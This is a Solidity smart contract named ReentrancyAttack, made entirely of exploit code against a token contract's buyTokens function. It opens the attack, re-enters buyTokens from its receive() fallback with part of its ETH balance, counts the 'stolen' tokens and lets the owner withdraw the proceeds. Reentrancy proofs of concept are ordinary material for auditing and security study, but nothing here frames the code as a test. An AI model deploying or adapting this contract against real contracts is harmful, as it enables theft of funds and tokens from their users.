// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISharedSubscriptionToken {
    function buyTokens(uint256 amount) external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract ReentrancyAttack {
    ISharedSubscriptionToken public target;
    address public owner;
    uint256 public attackCount;
    bool public attacking;
    uint256 public stolenTokens;

    event AttackLog(string message, uint256 balance);

    constructor(address _target) {
        target = ISharedSubscriptionToken(_target);
        owner = msg.sender;
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");
        
        // Reset attack count
        attackCount = 0;
        attacking = true;
        
        // Initial token balance
        uint256 initialTokens = target.balanceOf(address(this));
        
        // Buy tokens with a value that will trigger the receive function
        target.buyTokens{value: msg.value}(1);
        
        // End the attack
        attacking = false;
        
        // Check how many tokens we got from the attack
        stolenTokens = target.balanceOf(address(this)) - initialTokens;
    }

    // This fallback function is called when we receive ETH
    receive() external payable {
        if (attacking) {
            attackCount++;
            emit AttackLog("Received ETH during attack", address(this).balance);
            
            // Try to call buyTokens again to exploit reentrancy
            if (attackCount < 3 && msg.value > 0) {
                // Use 1/3 of our remaining ETH for each reentrant call
                uint256 attackValue = address(this).balance / 3;
                if (attackValue > 0) {
                    target.buyTokens{value: attackValue}(1);
                }
            }
        }
    }

    // Allow the owner to withdraw any ETH from this contract
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}